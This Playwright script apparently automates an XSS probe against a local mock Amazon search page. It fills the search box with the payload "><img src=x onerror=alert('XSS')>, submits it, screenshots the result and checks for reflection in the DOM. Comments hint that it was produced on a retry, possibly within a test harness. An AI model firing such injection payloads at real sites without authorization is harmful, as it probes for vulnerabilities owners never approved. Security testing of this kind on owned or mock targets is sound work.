import path from 'path';

export default async function(page, fileUrl, screenshotsDir) {
  try {
    // Navigate to the HTML file
    await page.goto(fileUrl);
    await page.waitForLoadState('networkidle');

    // Take initial screenshot
    const screenshots = [];
    const step1 = path.join(screenshotsDir, 'step_1_initial.png');
    await page.screenshot({ path: step1 });
    screenshots.push(step1);

    // Wait for the search input by placeholder (different selector from previous attempts)
    await page.waitForSelector('input[placeholder="Search Amazon"]', { timeout: 5000 });

    // Attempt XSS via search input
    const xssPayload = `"><img src=x onerror=alert('XSS')>`;
    await page.fill('input[placeholder="Search Amazon"]', xssPayload);

    // Take screenshot after filling input
    const step2 = path.join(screenshotsDir, 'step_2_xss_input.png');
    await page.screenshot({ path: step2 });
    screenshots.push(step2);

    // Wait for the search button by role and class (new selector strategy)
    await page.waitForSelector('button.search-btn', { timeout: 5000 });

    // Click the first visible search button using nth-of-type (to avoid ambiguity)
    const searchButtons = await page.$$('button.search-btn');
    if (searchButtons.length === 0) throw new Error('No search button found');
    await searchButtons[0].click();

    // Wait for any notification or result area (wait for DOM update)
    // Try to wait for a result count or notification (try multiple selectors)
    let resultSelector = null;
    try {
      await page.waitForSelector('.results-count', { timeout: 5000 });
      resultSelector = '.results-count';
    } catch {
      try {
        await page.waitForSelector('.notification', { timeout: 5000 });
        resultSelector = '.notification';
      } catch {
        // fallback: wait for main content to update
        await page.waitForSelector('#mainContent', { timeout: 5000 });
        resultSelector = '#mainContent';
      }
    }

    // Take screenshot after search
    const step3 = path.join(screenshotsDir, 'step_3_after_search.png');
    await page.screenshot({ path: step3 });
    screenshots.push(step3);

    // Extract possible XSS evidence from main content and notification
    const mainContentHtml = await page.$eval('#mainContent', el => el.innerHTML).catch(() => '');
    const notificationText = await page.$eval('.notification', el => el.textContent).catch(() => '');

    // Check if payload appears in the DOM (rudimentary XSS check)
    const xssEvidence = (mainContentHtml.includes(xssPayload) || notificationText.includes(xssPayload));

    return {
      success: true,
      action: "Attempted XSS via search input and submitted the payload. Checked for payload reflection in results.",
      extractedData: {
        xssPayload,
        mainContentSnippet: mainContentHtml ? mainContentHtml.slice(0, 500) : '',
        notificationText,
        xssEvidence
      },
      screenshots,
      error: null
    };
  } catch (error) {
    return {
      success: false,
      action: "Failed to complete task",
      extractedData: {},
      screenshots: [],
      error: error.message
    };
  }
}
